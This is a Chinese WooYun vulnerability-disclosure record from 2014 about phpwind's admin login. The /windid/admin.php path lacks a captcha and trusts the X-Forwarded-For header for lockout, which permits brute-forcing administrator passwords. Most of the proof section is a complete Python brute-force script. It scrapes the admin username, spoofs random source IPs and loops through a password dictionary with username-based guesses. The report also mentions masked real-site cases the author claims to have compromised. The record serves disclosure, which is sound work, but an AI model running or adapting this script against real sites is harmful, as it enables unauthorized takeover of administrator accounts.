{"id": 47590, "wybug_id": "wooyun-2014-080327", "wybug_title": "phpwind后台帐号密码可爆破无视验证码 (有案例)", "wybug_corp": "phpwind", "wybug_author": "JJ Fly", "wybug_date": "2014-10-22 08:11", "wybug_open_date": "2015-01-20 08:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向公众公开  简要描述： 没看源码，直接黑盒测试的。非验证码识别。老规矩 附上利用代码+几个成功案例。 详细说明：  我们先来看下官网http://www.phpwind.net/admin.php\n\n有验证码然后我们在来看下http://www.phpwind.net/windid/admin.php\n\n验证码不见了。然后我虚拟机搭建了一下phpwind(开启验证码，默认是不开启的、)\n\n\n\nhttp://192.168.1.117/windid/admin.php同样没有验证码 随后在这个网址登录 帐号密码。登录成功之后，打开http://192.168.1.117/admin.php也是登录状态。但是正常爆破的话，8次就提示错误了。\n\n但是测试发现是经过 X-Forwarded-For 进行判断来源ip的这样就可以修改xff进行爆破了。想要爆破密码，必须要知道他的帐号，这个获取管理员帐号的方式很多，下面我们说一个简单的方法。我们可以在个人空间处获取。(如果删除这个id之后，这种方法就不行了。)http://192.168.1.117/index.php?m=space&uid=1\n\n   漏洞证明：  爆破程序代码如下<poc>\n#coding:utf-8import httplib,re,random,urllib,timefrom sys import argv# 进行爆破 def getHtml(host,username,password):\tip=str(random.randint(1,100))+\".\"+str(random.randint(100,244))+\".\"+str(random.randint(100,244))+\".\"+str(random.randint(100,244))\tpostHead={\t\t\"Host\":host,\t\t\"User-Agent\": \"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0\",\t\t\"X-Forwarded-For\":ip,\t\t'Content-Type':'application/x-www-form-urlencoded',\t\t'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\t\t'Connection':'keep-alive',\t\t'Cookie':'csrf_token=wooyun'\t\t}\tpostContent='username='+username+'&password='+password+'&submit=&csrf_token=wooyun'\tresultHtml=httplib.HTTPConnection(host, 80, False)\tresultHtml.request('POST','/windid/admin.php?a=login',body=postContent,headers = postHead )\tpage=resultHtml.getresponse()\tpageConect=page.read()\treturn pageConect#获取 formhash  和  seccodehiddendef getusername(host):\turl='http://'+host+'/index.php?m=space&uid=1'\tpageContent=urllib.urlopen(url).read()\tr1=re.compile('\">(\\S{1,30})的个人空间</a>')\tusername=r1.findall(pageContent)[0]\treturn username#通过argv获取 host 字典 间隔时间 进行爆破if(len(argv)==1):\tprint '---->python '+argv[0]+' host地址 字典文件 间隔时间'\tprint '---->python '+argv[0]+' 192.168.1.105 pass.txt 0.2'else:\thost=argv[1]\tpassfile=argv[2]\tsleeptime=argv[3]\tprint '网站host为  '+host\tprint '密码字典为  '+passfile\tprint '间隔时间为  '+sleeptime\tprint '--->'\tusername=getusername(host)\tf=open(passfile,'r')\thtmlpass=f.read().split('\\r\\n')\tf.close()\tuserpass=[username+'123',username+'888',username+username,username+'..',username+'.',username+'admin888',username+'admin123',username+'admin',username+'123456']\thtmlpass=userpass+htmlpass\tfor i in range(len(htmlpass)):\t\ttime.sleep(float(sleeptime))\t\tprint '正在尝试密码'+htmlpass[i]\t\tif(getHtml(host,username,htmlpass[i])==''):\t\t\tprint '帐号为 '+username\t\t\tprint '密码为 '+htmlpass[i]\t\t\tbreak\n</poc>演示\n\n\n\n下面说几个案例\n\nmask 区域\n***** admin  **********  admin  **********cn  adm**********n.com ad**********  admin *****\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  你们更专业   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-10-22 10:59 厂商回复： 感谢您对我们的支持与关注，该问题我们正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-22 13:06 |    \t\t黑侠 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 帮助别人，等于帮助自己)\t\t \n  这漏洞这么厉害呀，有多少厉害呀？楼主，不知道影响什么版本，还是全部版本都受到影响呢？有安全问题也能够暴利破解吗？验证码没什么用？    \n     2014-10-22 13:06 |    \t\t黑侠 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 帮助别人，等于帮助自己)\t\t \n  phpwind 现在漏洞比较多呀，公司得多给力呀，关注下    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}